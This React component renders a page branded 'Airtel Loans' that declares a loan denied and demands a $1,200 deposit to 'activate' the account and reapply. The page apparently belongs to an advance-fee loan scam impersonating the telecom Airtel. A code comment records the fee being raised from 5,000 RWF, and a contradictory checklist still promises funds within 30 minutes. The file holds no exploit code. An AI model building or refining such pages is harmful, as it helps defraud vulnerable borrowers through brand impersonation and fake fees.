import React from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelDenied() {
  const navigate = useNavigate();

  return (
    <div className="airtel-container">
      {/* Header Section */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel Loans</h1>
        <p className="airtel-tagline">Quick loans. Anytime. Anywhere.</p>
      </div>

      {/* Main White Card */}
      <div className="airtel-card">
        {/* Denied Icon */}
        <div className="airtel-denied-icon">
          <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="12" y1="8" x2="12" y2="12"></line>
            <line x1="12" y1="16" x2="12.01" y2="16"></line>
          </svg>
        </div>
        
        <h2 className="airtel-denied-heading">Loan Denied!</h2>
        <p className="airtel-denied-subtext">Your loan has been Denied</p>

        {/* Inactive Airtel Box */}
        <div className="airtel-inactive-box">
          <div className="airtel-inactive-title">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="5" width="20" height="14" rx="2"></rect>
              <line x1="2" y1="10" x2="22" y2="10"></line>
            </svg>
            <span>Inactive Airtel</span>
          </div>
          <p className="airtel-inactive-text">Please deposit at least</p>
          {/* CHANGED FROM 5,000 RWF TO $1,200 */}
          <p className="airtel-inactive-amount">$1,200</p>
          <p className="airtel-inactive-text">in your Airtel account to make it active and reapply</p>
        </div>

        {/* Checklist Box */}
        <div className="airtel-checklist-box">
          <div className="airtel-checklist-item">
            <span className="checkmark">✓</span> Funds will be transferred to your account within 30 minutes
          </div>
          <div className="airtel-checklist-item">
            <span className="checkmark">✓</span> Loan repayment period: 12 months
          </div>
          <div className="airtel-checklist-item">
            <span className="checkmark">✓</span> You can now access your Fast Credit dashboard
          </div>
        </div>

        {/* Dashboard Button */}
        <button className="airtel-dashboard-btn" onClick={() => alert("Navigating to Dashboard")}>
          Go to Dashboard
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="5" y1="12" x2="19" y2="12"></line>
            <polyline points="12 5 19 12 12 19"></polyline>
          </svg>
        </button>

        {/* Back to Login */}
        <button className="airtel-back-to-login" onClick={() => navigate('/')}>
          Back to login
        </button>
      </div>
    </div>
  );
}

export default AirtelDenied;